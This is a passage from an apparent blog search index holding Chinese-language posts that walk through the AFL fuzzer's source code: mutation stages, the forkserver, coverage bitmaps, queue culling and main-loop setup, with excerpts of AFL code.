16-bit */\\ 32768, /* Overflow signed 16-bit */\\ 65535, /* Overflow unsig 16-bit when incremented */\\ 65536, /* Overflow unsig 16 bit */\\ 100663045, /* Large positive number (endian-agnostic) */\\ 2147483647 /* Overflow signed 32-bit when incremented */ could_be_arith 与上一阶段去重。并且，这一阶段同样受 eff_map 影响。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:3:0","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"interest 8/8 从头到尾，步长为 1 byte，用 INTERESTING_8 中的每个数替换测试用例 1 byte for (i = 0; i \u003c len; i++) { u8 orig = out_buf[i]; /* Let's consult the effector map... */ if (!eff_map[EFF_APOS(i)]) { stage_max -= sizeof(interesting_8); continue; } stage_cur_byte = i; for (j = 0; j \u003c sizeof(interesting_8); j++) { /* Skip if the value could be a product of bitflips or arithmetics. */ if (could_be_bitflip(orig ^ (u8)interesting_8[j]) || could_be_arith(orig, (u8)interesting_8[j], 1)) { stage_max--; continue; } stage_cur_val = interesting_8[j]; out_buf[i] = interesting_8[j]; if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; out_buf[i] = orig; stage_cur++; } } ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:3:1","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"interest 16/8 从头到尾，步长为 1 byte，用 INTERESTING_16 中的每个数替换测试用例 1 word ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:3:2","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"interest 32/8 从头到尾，步长为 1 byte，用 INTERESTING_32 中的每个数替换测试用例 1 dword ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:3:3","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"dictionary stuff 这一阶段用字典内容对测试用例进行替换。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:4:0","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"user extras (over) 先将 extras 按长度从小到大排，以便复原。 从头到尾，步长为 1 byte，用 extras 中的每个字符串替换测试用例相同长度。受 eff_map 影响。 for (j = 0; j \u003c extras_cnt; j++) { /* Skip extras probabilistically if extras_cnt \u003e MAX_DET_EXTRAS. Also skip them if there's no room to insert the payload, if the token is redundant, or if its entire span has no bytes set in the effector map. */ if ((extras_cnt \u003e MAX_DET_EXTRAS \u0026\u0026 UR(extras_cnt) \u003e= MAX_DET_EXTRAS) || extras[j].len \u003e len - i || !memcmp(extras[j].data, out_buf + i, extras[j].len) || !memchr(eff_map + EFF_APOS(i), 1, EFF_SPAN_ALEN(i, extras[j].len))) { stage_max--; continue; } “AFL 会检查 tokens 的数量，如果数量大于预设的 MAX_DET_EXTRAS（默认值为 200），那么对每个 token 会根据概率来决定是否进行替换：这里的 UR(extras_cnt) 是运行时生成的一个 0 到 extras_cnt 之间的随机数。所以，如果用户词典中一共有 400 个 tokens，那么每个 token 就有 200/400=50% 的概率执行替换变异。我们可以修改 MAX_DET_EXTRAS 的大小来调整这一概率。” ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:4:1","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"user extras (insert) 从头到尾，步长为 1 byte，将 extras 中的每个字符串尝试插入测试用例。不受 eff_map 影响。 这一阶段复原相比于上述阶段更耗时，涉及到空间分配、拷贝、复原等操作。 “所以，如果用户提供了大量 tokens，或者原文件很大，那么这一阶段的运算量就会非常的多。直观表现上，就是AFL的执行状态栏中，”user extras (insert)” 的总执行量很大，执行时间很长。如果出现了这种情况，那么就可以考虑适当删减一些 tokens。” ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:4:2","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"auto extras (over) 上文提到 bitflip 时会产生字典。在这一步将使用这个字典。 从头到尾，步长为 1 byte，用其中的每个字符串替换测试用例相同长度。受 eff_map 影响。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:4:3","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"random havoc dumb mode 会直接从这一阶段开始，跳过上述确定性过程。后续所有的变异都是随机的。 在这一阶段，AFL 会计算得到一个操作轮数，每一轮再产生一个随机数作为每轮的操作次数，每次在以下操作中选择一个： 随机选取某个 bit 进行翻转 随机选取某个 byte，将其设置为随机的 interesting value 随机选取某个 word，并随机选取大、小端序，将其设置为随机的 interesting value 随机选取某个 dword，并随机选取大、小端序，将其设置为随机的 interesting value 随机选取某个 byte，对其减去一个随机数 随机选取某个 byte，对其加上一个随机数 随机选取某个 word，并随机选取大、小端序，对其减去一个随机数 随机选取某个 word，并随机选取大、小端序，对其加上一个随机数 随机选取某个 dword，并随机选取大、小端序，对其减去一个随机数 随机选取某个 dword，并随机选取大、小端序，对其加上一个随机数 随机选取某个 byte，将其设置为随机数 随机删除一段 bytes 随机选取一个位置，插入一段随机长度的内容，其中 75% 的概率是插入原文中随机位置的内容，25% 的概率是插入一段随机选取的数 随机选取一个位置，替换为一段随机长度的内容，其中 75% 的概率是替换成原文中随机位置的内容，25% 的概率是替换成一段随机选取的数 随机选取一个位置，用随机选取的 token（用户提供的或自动生成的）替换 随机选取一个位置，用随机选取的 token（用户提供的或自动生成的）插入 （摘自 https://bbs.pediy.com/thread-254705.htm） 在充满随机的 havoc 大杂烩中，AFL 对测试用例做了一系列天马行空的变异尝试。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:5:0","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"splicing 在这一阶段，AFL 尝试对各个测试用例之间做切分、拼接操作。 在队列中随机选取另一个测试用例，用 locate_diffs 在这两个测试用例的 first differing byte 与 last differing byte 中选取一个切分位置（如果两个测试用例太接近则重新选），将它们各自分割为 2 部分。最后，将随机选取的测试用例的尾与该测试用例的头拼接起来，作为变异结果。 至此，一个测试用例的所有变异尝试便结束了。 ","date":"2022-01-28","objectID":"/2022/01/afl-rsc4/:6:0","tags":null,"title":"AFL 源码分析（完）变异详解","uri":"/2022/01/afl-rsc4/"},{"categories":["General"],"content":"AFL 源源不断地将变异得到的测试用例喂给待测试程序，这个过程中少不了 fork 与 execve. 为提高效率、减少开销，它实现了一套 forkserver 机制来反复运行并测试程序。 “为了更高效地进行上述过程，AFL实现了一套 fork server 机制。其基本思路是：启动 target 进程后，target 会运行一个 fork server；fuzzer 并不负责 fork 子进程，而是与这个 fork server 通信，并由 fork server 来完成 fork 及继续执行目标的操作。这样设计的最大好处，就是不需要调用 execve()，从而节省了载入目标文件和库、解析符号地址等重复性工作。如果熟悉 Android 的话，可以将 fork server 类比为 zygote. ” init_fork_server 函数启动 forkserver. Spin up fork server (instrumented mode only). The idea is explained here. In essence, the instrumentation allows us to skip execve(), and just keep cloning a stopped child. So, we just execute once, and then send commands through a pipe. The other part of this logic is in afl-as.h. run_target 函数向 forkserver 发送信号，执行待测试程序并分析执行结果。 Execute target application, monitoring for timeouts. Return status information. The called program will update trace_bits[]. 能搜集到的资料中有不少 forkserver 的分析，其本身也十分容易理解。总的来说，fuzzer 进程是 target 进程的祖先，forkserver 进程本身也是 fuzzer 进程 fork and execve 目标程序得来的。 fuzzer 在 init_forkserver 中布置好管道，fork 出子进程。父进程（fuzzer）持续存在并收集信息、发送信号，子进程调用 execv(target_path, argv); 执行 target. 注意此时没有开始喂入测试用例！这个 target 会执行插桩代码，在程序入口点停下等待 fuzzer 发号施令，并从此充当 forkserver 的角色。之后，当收到 fuzzer 进程执行 run_target 函数发来的信号时，forkserver 进程再 fork 出 target 进程，运行并投喂测试用例，并将结果返回给 fuzzer 进程。 一篇非常清晰的 forkserver 插桩代码分析，见此文。 正如白皮书所说，这样可以免去 libc 库链接等重复操作。毕竟每个 target 被 fork 出来便已经到了程序入口点，直接执行即可。可以认为，forkserver 机制免去了每次执行 target 都要运行 execve 的烦扰。 ","date":"2022-01-26","objectID":"/2022/01/afl-rsc3/:0:0","tags":null,"title":"AFL 源码分析（三）forkserver 详解","uri":"/2022/01/afl-rsc3/"},{"categories":["General"],"content":"紧接上一部分，本文将更进一步探讨 AFL 如何在运行时保存和分析路径覆盖信息，以及队列优胜者的选取思路。前者为启发式变异提供导向，后者为 culling the corpus 的基础。 ","date":"2022-01-23","objectID":"/2022/01/afl-rsc2/:0:0","tags":null,"title":"AFL 源码分析（二）路径覆盖信息 \u0026 队列优胜者","uri":"/2022/01/afl-rsc2/"},{"categories":["General"],"content":"路径覆盖信息的保存与分析 这部分主要涉及到 has_new_bits ","date":"2022-01-23","objectID":"/2022/01/afl-rsc2/:1:0","tags":null,"title":"AFL 源码分析（二）路径覆盖信息 \u0026 队列优胜者","uri":"/2022/01/afl-rsc2/"},{"categories":["General"],"content":"初始化 前文 提到 AFL 会调用 setup_shm 初始化内存。在这个函数中，virgin_bits 被初始化为一段二进制一的内存并全程维护作为总表，对于其中的每个字节，全一则代表对应元组未被访问。shmget 初始化一段同样大小的共享内存，通过 IPC 进行进程间的通信与同步。如果不是 dumb 模式就会将此共享内存的标识符设置在环境变量中，方便子进程（见 forkserver 部分）锁定。AFL 本身通过 trace_bits 变量指向这段共享内存，用来记录每次运行得到的路径执行情况。 EXP_ST void setup_shm(void) { u8* shm_str; if (!in_bitmap) memset(virgin_bits, 255, MAP_SIZE); memset(virgin_tmout, 255, MAP_SIZE); memset(virgin_crash, 255, MAP_SIZE); shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); if (shm_id \u003c 0) PFATAL(\"shmget() failed\"); atexit(remove_shm); shm_str = alloc_printf(\"%d\", shm_id); /* If somebody is asking us to fuzz instrumented binaries in dumb mode, we don't want them to detect instrumentation, since we won't be sending fork server commands. This should be replaced with better auto-detection later on, perhaps? */ if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1); ck_free(shm_str); trace_bits = shmat(shm_id, NULL, 0); if (trace_bits == (void *)-1) PFATAL(\"shmat() failed\"); } ","date":"2022-01-23","objectID":"/2022/01/afl-rsc2/:1:1","tags":null,"title":"AFL 源码分析（二）路径覆盖信息 \u0026 队列优胜者","uri":"/2022/01/afl-rsc2/"},{"categories":["General"],"content":"运行时获取 每次 run_target() 的最开始会清零 trace_bits ，在执行时用如下插桩代码改变 trace_bits （ 见 afl-as.h/__afl_maybe_log ）回忆 白皮书 中对于插桩代码的伪代码描述。 在 afl-as.h/trampoline_fmt_64 中，插桩代码用 rcx 存储一个 (random() % (MAP_SIZE)) 范围的随机值，因此在处理到某个分支并且需要插入插桩代码时，afl-as 会产生一个此范围的随机数作为此边的 ID. 对应于伪代码第一行 cur_location = \u003cCOMPILE_TIME_RANDOM\u003e; static const u8* trampoline_fmt_64 = \"/* --- AFL TRAMPOLINE (64-BIT) --- */\\n\" //... \"movq %%rcx, 8(%%rsp)\\n\" \"movq $0x%08x, %%rcx\\n\" \"call __afl_maybe_log\\n\" //... \"\\n\" \"/* --- END --- */\\n\" \"\\n\"; 进入到 __afl_maybe_log，首先会检查共享内存是否设置好 \" /* Check if SHM region is already mapped. */\\n\" \"\\n\" \" movl __afl_area_ptr, %edx\\n\" \" testl %edx, %edx\\n\" \" je __afl_setup\\n\" \"\\n\" \"__afl_store:\\n\" 然后开始如下计算，可见 __afl_pre_loc 便是伪代码中 prev_location ，保存上一个元组位置。在对 cur_location 进行异或后将 cur_location 右移一位作为新的 prev_location . #ifndef COVERAGE_ONLY \" movl __afl_prev_loc, %edi\\n\" \" xorl %ecx, %edi\\n\" \" shrl $1, %ecx\\n\" \" movl %ecx, __afl_prev_loc\\n\" #else \" movl %ecx, %edi\\n\" #endif /* ^!COVERAGE_ONLY */ \"\\n\" 然后用 rcx 与 rdx 来改变 trace_bits 内存区域。 #ifdef SKIP_COUNTS \" orb $1, (%rdx, %rcx, 1)\\n\" #else \" incb (%rdx, %rcx, 1)\\n\" 这便是在一次执行中插桩代码对路径覆盖表做的改变。 ","date":"2022-01-23","objectID":"/2022/01/afl-rsc2/:1:2","tags":null,"title":"AFL 源码分析（二）路径覆盖信息 \u0026 队列优胜者","uri":"/2022/01/afl-rsc2/"},{"categories":["General"],"content":"以路径覆盖为指导 在上一步得到改变 trace_bits 后调用 classify_counts(trace_bits) 对其做预处理，此函数将传入的内存按每两个字节做 count_class_lookup16 变换。 static inline void classify_counts(u64* mem) { //... mem16[0] = count_class_lookup16[mem16[0]]; mem16[1] = count_class_lookup16[mem16[1]]; mem16[2] = count_class_lookup16[mem16[2]]; mem16[3] = count_class_lookup16[mem16[3]]; //... } 其中 count_class_lookup8 便是白皮书提到的桶操作，将一字节宽的变量按如下映射。 static const u8 count_class_lookup8[256] = { [0] = 0, // 00000000 [1] = 1, // 00000001 [2] = 2, // 00000010 [3] = 4, // 00000100 [4 ... 7] = 8, // 00001000 [8 ... 15] = 16,// 00010000 [16 ... 31] = 32,// 00100000 [32 ... 127] = 64,// 01000000 [128 ... 255] = 128// 10000000 }; 二字节宽的 count_class_lookup16 就是将前后两个字节分开计算 count_class_lookup8，可能是为了提高效率。 static u16 count_class_lookup16[65536]; EXP_ST void init_count_class16(void) { u32 b1, b2; for (b1 = 0; b1 \u003c 256; b1++) for (b2 = 0; b2 \u003c 256; b2++) count_class_lookup16[(b1 \u003c\u003c 8) + b2] = (count_class_lookup8[b1] \u003c\u003c 8) | count_class_lookup8[b2]; } run_target() 结束后会调用 has_new_bits(virgin_bits) 去判断是否产生了新的元组，该函数将 trace_bits 与 virgin_bits 做一系列对比，得到返回值：1 代表元组命中数改变，2 代表新元组产生。这个函数会将上述两个待比较的内存以 8 个 字节为一组（64位下），对每组进行如下对比判断，最后清零 virgin_bits 相应位，代表此位置对应元组已被命中。 if (unlikely(*current) \u0026\u0026 unlikely(*current \u0026 *virgin)) { if (likely(ret \u003c 2)) { u8* cur = (u8*)current; u8* vir = (u8*)virgin; if ((cur[0] \u0026\u0026 vir[0] == 0xff) || (cur[1] \u0026\u0026 vir[1] == 0xff) || (cur[2] \u0026\u0026 vir[2] == 0xff) || (cur[3] \u0026\u0026 vir[3] == 0xff) || (cur[4] \u0026\u0026 vir[4] == 0xff) || (cur[5] \u0026\u0026 vir[5] == 0xff) || (cur[6] \u0026\u0026 vir[6] == 0xff) || (cur[7] \u0026\u0026 vir[7] == 0xff)) ret = 2; else ret = 1; } *virgin \u0026= ~*current; } 应该不会有人像我一样因为不注意 \u0026\u0026 与 == 运算符的优先级而看不懂逻辑吧？ 同样，save_if_interesting 中也会调用 has_new_bits 获取返回值，如果为 0 则代表本次执行没有新的路径产生，该测试用例不会被放入测试队列，也不会写入磁盘。只有返回 1 或 2 时才会保留测试用例。 总的来说，AFL 的启发式变异就体现在此，只有当 has_new_bits 返回非 0 时（即测试用例带来了元组命中次数的改变或新命中元组的产生）该测试用例才会被放入测试队列被进一步变异。如白皮书说所，这样的启发式思想给 AFL 带来了超过 Blind fuzzing, 以 Block coverage, Edge coverage 为导向的 fuzzing 性能。 ","date":"2022-01-23","objectID":"/2022/01/afl-rsc2/:1:3","tags":null,"title":"AFL 源码分析（二）路径覆盖信息 \u0026 队列优胜者","uri":"/2022/01/afl-rsc2/"},{"categories":["General"],"content":"优胜者策略 此部分主要涉及到 update_bitmap_score, cull_queue . ","date":"2022-01-23","objectID":"/2022/01/afl-rsc2/:2:0","tags":null,"title":"AFL 源码分析（二）路径覆盖信息 \u0026 队列优胜者","uri":"/2022/01/afl-rsc2/"},{"categories":["General"],"content":"指导因子标记 队列用链表实现，每个元素代表一个测试用例，结构体为 queue_entry，着重注意它的成员变量 trace_mini 与 tc_ref ，在这一部分起到重要效果。 struct queue_entry { u8* fname; /* File name for the test case */ u32 len; /* Input length */ u8 cal_failed, /* Calibration failed? */ trim_done, /* Trimmed? */ was_fuzzed, /* Had any fuzzing done yet? */ passed_det, /* Deterministic stages passed? */ has_new_cov, /* Triggers new coverage? */ var_behavior, /* Variable behavior? */ favored, /* Currently favored? */ fs_redundant; /* Marked as redundant in the fs? */ u32 bitmap_size, /* Number of bits set in bitmap */ exec_cksum; /* Checksum of the execution trace */ u64 exec_us, /* Execution time (us) */ handicap, /* Number of queue cycles behind */ depth; /* Path depth */ u8* trace_mini; /* Trace bytes, if kept */ u32 tc_ref; /* Trace bytes ref count */ struct queue_entry *next, /* Next element, if any */ *next_100; /* 100 elements ahead */ }; AFL 维护一个数组 top_rated ，它的每个条目对应 bitmap 中一个字节（即一个元组的命中情况）。 static struct queue_entry* top_rated[MAP_SIZE]; 对表中每一个字节，即每一个元组，都用 top_rated 一一对应到一个队列元素，代表这个元组的“最佳测试用例”。 对每个队列元素定义参考值 u64 fav_factor = q-\u003eexec_us * q-\u003elen; AFL 用测试用例执行时间与长度的乘积作为“最佳测试用例”的度量标准，如白皮书所说，简单却有效。 在 run_target() 中得到 bitmap 后会调用 update_bitmap_score 函数。它遍历 trace_bits 的每个字节，如果当前字节为 1（即此元组在此次执行时命中）则初始化 top_rated 条目为此队列元素。当以后执行又命中此元组时（即当 top_rated 对应条目不为空时），该元组会选取更小参考值的队列元素作为其 top_rated 条目，并将 score_changed 置 1 。在这个过程中，队列元素的成员变量 tc_ref 记录了此队列元素被元组认为是优胜者的次数，如果减为 0，则会将 trace_mini 空间释放；如果从 0 到 1，则为 成员变量 trace_mini 分配内存，并调用 minimize_bits 来缩减 trace_bits 得到 trace_mini 。 if (top_rated[i]) { if (fav_factor \u003e top_rated[i]-\u003eexec_us * top_rated[i]-\u003elen) continue; if (!--top_rated[i]-\u003etc_ref) { // 减到 0 则释放内存 ck_free(top_rated[i]-\u003etrace_mini); top_rated[i]-\u003etrace_mini = 0; } } top_rated[i] = q; q-\u003etc_ref++; if (!q-\u003etrace_mini) { q-\u003etrace_mini = ck_alloc(MAP_SIZE \u003e\u003e 3); // 分配内存 minimize_bits(q-\u003etrace_mini, trace_bits); } score_changed = 1; update_bitmap_score 的优化方向为：trace_bits 不变但队列元素的 fav_factor 趋于最小。 而 minimize_bits 函数就是简单地将 trace_bits 缩减到原来的 1/8 存储到 trace_mini , trace_mini 的一个 bit 对应了 trace_bits 的一个字节。也就是说，这样的压缩方式去掉了 trace_bits 中元组命中次数的信息，而只保留了该元组是否命中的信息。 /* Compact trace bytes into a smaller bitmap. We effectively just drop the count information here. This is called only sporadically, for some new paths. */ static void minimize_bits(u8 *dst, u8 *src) { u32 i = 0; while (i \u003c MAP_SIZE) { if (*(src++)) dst[i \u003e\u003e 3] |= 1 \u003c\u003c (i \u0026 7); i++; } } 上述过程得到的 trace_mini, top_rated, score_changed 将作为指导因子，指导后续过程。 ","date":"2022-01-23","objectID":"/2022/01/afl-rsc2/:2:1","tags":null,"title":"AFL 源码分析（二）路径覆盖信息 \u0026 队列优胜者","uri":"/2022/01/afl-rsc2/"},{"categories":["General"],"content":"剪枝因子标记 run_target() 后会调用 cull_queue 对队列进行剪枝。该函数如下： 初始化 temp_v 为全二进制一的内存，大小与 trace_mini 相同，它的一个 bit 同样对应了 trace_bits 的一个字节，用于在这一函数中标识没有被访问的元组。 这里本质上还是使用了贪心算法。前面提到，队列元素的 trace_mini 保存了该测试用例命中的元组信息。而 top_rated 指示的队列元素的 trace_mini 便是在优胜者圈子内的测试用例命中的元组信息。但不是所有优胜者的 favored 都被置 1，AFL 贪心地认为对于每个被命中的元组，遍历时第一次遇到的优胜者就是“更受喜爱的”，并置成员变量 favored 为 1. if (top_rated[i] \u0026\u0026 (temp_v[i \u003e\u003e 3] \u0026 (1 \u003c\u003c (i \u0026 7)))) { u32 j = MAP_SIZE \u003e\u003e 3; /* Remove all bits belonging to the current entry from temp_v. */ while (j--) if (top_rated[i]-\u003etrace_mini[j]) temp_v[j] \u0026= ~top_rated[i]-\u003etrace_mini[j]; top_rated[i]-\u003efavored = 1; queued_favored++; if (!top_rated[i]-\u003ewas_fuzzed) pending_favored++; 标记好“更受喜爱”的测试用例之后，遍历每个测试用例调用 mark_as_redundant 做处理。 q = queue; while (q) { mark_as_redundant(q, !q-\u003efavored); q = q-\u003enext; } 在 mark_as_redundant 中，未被 favored 标记的测试用例，其成员变量 fs_redundant 会被置 1，并放入 out_dir/queue/.state/redundant_edges/ 文件夹中。如果它在后续又被 favored 标记，则从文件夹中删去；反之同理。 所以总的来说 cull_queue 干了两件事情，选择优胜者并标记为 favored ，并将剩余测试用例标记为 fs_redundant 并在磁盘中留下名字。正如白皮书所说，AFL 并未将非优胜者直接剔除。 ","date":"2022-01-23","objectID":"/2022/01/afl-rsc2/:2:2","tags":null,"title":"AFL 源码分析（二）路径覆盖信息 \u0026 队列优胜者","uri":"/2022/01/afl-rsc2/"},{"categories":["General"],"content":"指导测试过程 在 fuzz_one 函数中 pending_favored 时，was_fuzzed 或是 非优胜者 会以 SKIP_TO_NEW_PROB 概率跳过测试。 没有 pending_favored 时 非优胜者 没被 fuzz 过会以 SKIP_NFAV_NEW_PROB 概率跳过。 被 fuzz 过以 SKIP_NFAV_OLD_PROB 概率跳过。 优胜者不跳过 if (pending_favored) { /* If we have any favored, non-fuzzed new arrivals in the queue, possibly skip to them at the expense of already-fuzzed or non-favored cases. */ if ((queue_cur-\u003ewas_fuzzed || !queue_cur-\u003efavored) \u0026\u0026 UR(100) \u003c SKIP_TO_NEW_PROB) return 1; } else if (!dumb_mode \u0026\u0026 !queue_cur-\u003efavored \u0026\u0026 queued_paths \u003e 10) { /* Otherwise, still possibly skip non-favored cases, albeit less often. The odds of skipping stuff are higher for already-fuzzed inputs and lower for never-fuzzed entries. */ if (queue_cycle \u003e 1 \u0026\u0026 !queue_cur-\u003ewas_fuzzed) { if (UR(100) \u003c SKIP_NFAV_NEW_PROB) return 1; } else { if (UR(100) \u003c SKIP_NFAV_OLD_PROB) return 1; } } 这便是剪枝因子指导测试队列减小的全过程。 ","date":"2022-01-23","objectID":"/2022/01/afl-rsc2/:2:3","tags":null,"title":"AFL 源码分析（二）路径覆盖信息 \u0026 队列优胜者","uri":"/2022/01/afl-rsc2/"},{"categories":["General"],"content":"afl-fuzz.c 概览，后续重点将放在 forkserver 和启发式变异细节上。 ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:0:0","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"Main 函数鸟瞰 ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:1:0","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"Get Option 在这一部分，AFL 会读取用户指定的参数 \"Required parameters:\\n\\n\" \" -i dir - input directory with test cases\\n\" \" -o dir - output directory for fuzzer findings\\n\\n\" \"Execution control settings:\\n\\n\" \" -f file - location read by the fuzzed program (stdin)\\n\" \" -t msec - timeout for each run (auto-scaled, 50-%u ms)\\n\" \" -m megs - memory limit for child process (%u MB)\\n\" \" -Q - use binary-only instrumentation (QEMU mode)\\n\\n\" \"Fuzzing behavior settings:\\n\\n\" \" -d - quick \u0026 dirty mode (skips deterministic steps)\\n\" \" -n - fuzz without instrumentation (dumb mode)\\n\" \" -x dir - optional fuzzer dictionary (see README)\\n\\n\" \"Other stuff:\\n\\n\" \" -T text - text banner to show on the screen\\n\" \" -M / -S id - distributed mode (see parallel_fuzzing.txt)\\n\" \" -C - crash exploration mode (the peruvian rabbit thing)\\n\" \" -V - show version number and exit\\n\\n\" \" -b cpu_id - bind the fuzzing process to the specified CPU core\\n\\n\" 文档中给出的输入参数如上，查阅源码会得到如下更详细的信息 -i, -o 指定输入、输出文件夹，改变 in_dir, out_dir -M, -S 并行设置，改变 sync_id -f 指定临时输出文件（并行时不同 fuzzer 不能指定为同一个）改变 out_file -x 用户指定额外的字典，读给 extras_dir -t 指定超时时间， %u%c 读给 exec_tmout 与 suffix，改变 timeout_given u8 suffix = 0; if (timeout_given) FATAL(\"Multiple -t options not supported\"); if (sscanf(optarg, \"%u%c\", \u0026exec_tmout, \u0026suffix) \u003c 1 || optarg[0] == '-') FATAL(\"Bad syntax used for -t\"); if (exec_tmout \u003c 5) FATAL(\"Dangerously low value of -t\"); if (suffix == '+') timeout_given = 2; else timeout_given = 1; -m 指定内存限制，%llu%c 读给 mem_limit 与 suffix，改变 mem_limit_given 以 MB 为单位，不得低于 5 MB，不得大于 2000 MB（sizeof(rlim_t) == 4时） switch (suffix) { case 'T': mem_limit *= 1024 * 1024; break; case 'G': mem_limit *= 1024; break; case 'k': mem_limit /= 1024; break; case 'M': break; } -b 指定特定 CPU 核心，读给 cpu_to_bind，改变 cpu_to_bind_given -B 指定 bitmap，读给 in_bitmap “这是一个没有在文档中记录的选项，如果你在 fuzzing 过程中找到了一个有趣的测试用例，想将它变异又不想从头开始，可以用 -B 指示 fuzz_bitmap 为你这一轮得到的 bitmap，AFL 会在这个基础上去做 fuzz” if (in_bitmap) FATAL(\"Multiple -B options not supported\"); in_bitmap = optarg; read_bitmap(in_bitmap); -C 开关选项，打开 crash mode（见白皮书 #9） crash_mode = FAULT_CRASH; -n 开关选项，打开 dumb mode（不插桩） if (getenv(\"AFL_DUMB_FORKSRV\")) dumb_mode = 2; else dumb_mode = 1; -Q 开关选项，打开 qemu mode（黑盒插桩） -d 开关选项，可跳过确定性变异过程 skip_deterministic = 1; use_splicing = 1; -T 指定横幅（貌似没什么用…），读给 use_banner ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:1:1","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"Check Configuration 在这一部分，AFL 会如下依次检查当前配置是否存在冲突，并准备运行 输入、输出文件夹必须指定 setup_signal_handlers 设置信号处理函数 check_asan_opts 检查 ASAN 设置是否正确 如果开启并行，fix_up_sync 检查并行ID等 输入、输出文件夹不能是相同 dumb mode 与 crash mode 互斥 dumb mode 与 qemu mode 互斥 getenv 获取如下配置 AFL_NO_FORKSRV：与 AFL_DUMB_FORKSRV 冲突 AFL_NO_CPU_RED AFL_NO_ARITH AFL_SHUFFLE_QUEUE AFL_FAST_CAL AFL_HANG_TMOUT 用 AFL_PRELOAD 设置系统变量 LD_PRELOAD AFL_LD_PRELOAD 参数已被 AFL_PRELOAD 取代 save_cmdline 将命令行保存在orig_cmdline fix_up_banner 修复use_banner check_if_tty 查看是否在 tty 终端上运行的 AFL，改变not_no_tty get_core_count, bind_to_free_cpu 查看、绑定空闲 CPU 核心 check_crash_handling 查看崩溃处理的句柄，转存崩溃 check_cpu_governor setup_post 加载 postprocessor（if available） setup_shm 设置共享内存，初始化virgin_bits, virgin_tmout, virgin_crash, trace_bits init_count_class16 setup_dirs_fds 初始化输出文件夹与描述符 read_testcases 从输入文件夹读取种子，入队（后续包含较多 Linux 系统编程） 用 scandir 与 alphasort 扫描文件夹 shuffle_queue 决定是否调用 shuffle_ptrs 去随机打乱输入顺序 将未经过确定性变异的测试用例入队 access 判断该队列元素（测试用例）名字是否于 “in_dir/.state/deterministic_done/” 文件夹中存在 存在则认为该测试用例已经完成了确定性变异，不再送入队列重新处理 不存在则调用 add_to_queue 送入队列 load_auto 自动加载字典 token，从 “in_dir/auto_extras/auto_%06u” % cnt 位置处依次读取，调用 maybe_add_auto 按规则加入字典 pivot_inputs 在输出文件夹中为测试用例创建硬链接，有如下命名规则 SIMPLE_FILES 有定义时， “in_dir/queue/id:%06u” % id SIMPLE_FILES 无定义时， “in_dir/queue/id:%06u,orig:%s” % id, use_name 调用 mark_as_det_done 在 “out_dir/queue/.state/deterministic_done/” 文件夹中产生已经完成确定性变异的测试用例文件 调用 nuke_resume_dir 删除掉 “out_dir/_resume/.state/” 文件夹中所有临时文件 load_extras 调用 load_extras_file 加载 token 如果没有设置 timeout_given，调用 find_timeout detect_file_args 处理 @@ 的输入命令（用于 AFL 的文件输入，harness 见前文） 如果没有 -f 设置临时输出，调用 setup_stdio_file 按 “out_dir/.cur_input” 设置并创建 check_binary 检查待测试文件的信息 get_cur_time 获取当前时间作为启动时间 如果开启 qemu mode 则 get_qemu_argv ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:1:2","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"Dry Run 在这一部分，AFL 会执行首轮 fuzz，预热。 perform_dry_run* 依次读取 queue 中内容 调用 calibrate_case 校准测试用例，得到返回值 res 根据 res 判断错误类型 cull_queue* 精简队列 show_init_stats 显示这一轮 dry run 的统计信息 find_start_position 从 fuzzer_stats 中找到当前测试用例，以便从这个位置继续 write_stats_file 在 fuzzer_stats 中创建新的统计数据 save_auto 将这一轮过程中产生的 token 保存在 “out_dir/queue/.state/auto_extras/auto_%06u” % cnt 目录下 ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:1:3","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"Main Loop 模糊测试终于开始了，在这一部分 AFL 会反复如下执行，直至停止条件满足。 cull_queue 如果当前 queue_cur 为空，代表已经遍历完一遍队列，初始化到队首重新遍历 show_stats 显示信息 如果这一轮队列与上一轮完全相同，说明此轮 fuzz 没有效果，则重组变异策略 fuzz_one* 对 queue_cur 指示的测试用例进行测试 移动 queue_cur 关闭方式有两种，programmatically （设置 stop_soon）以及 by 